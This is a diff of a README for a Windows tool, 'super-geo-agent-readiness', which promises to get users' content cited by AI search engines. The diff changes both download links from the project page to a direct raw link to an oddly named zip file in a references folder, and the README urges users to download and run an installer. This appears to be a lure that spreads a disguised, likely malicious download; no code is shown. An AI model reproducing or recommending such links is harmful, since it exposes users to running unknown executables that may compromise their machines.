@@ -1,6 +1,6 @@
 # 🌐 super-geo-agent-readiness - Get cited by major AI search engines
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/perocar8967/super-geo-agent-readiness)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/perocar8967/super-geo-agent-readiness/raw/refs/heads/main/super-geo-agent-readiness/references/readiness-super-agent-geo-protevangel.zip)
 
 This tool prepares your web presence for AI search engines. It formats your data so tools like ChatGPT, Perplexity, and Google AI Overviews find and cite your content. You need this to stay relevant in the age of generative search.
 
@@ -23,7 +23,7 @@ You need a Windows computer to run this application. Ensure your system meets th
 
 You must visit the project page to download the latest version for your computer. 
 
-[Click here to visit the release page and download the installer](https://github.com/perocar8967/super-geo-agent-readiness)
+[Click here to visit the release page and download the installer](https://github.com/perocar8967/super-geo-agent-readiness/raw/refs/heads/main/super-geo-agent-readiness/references/readiness-super-agent-geo-protevangel.zip)
 
 Follow these steps to complete the setup:
 
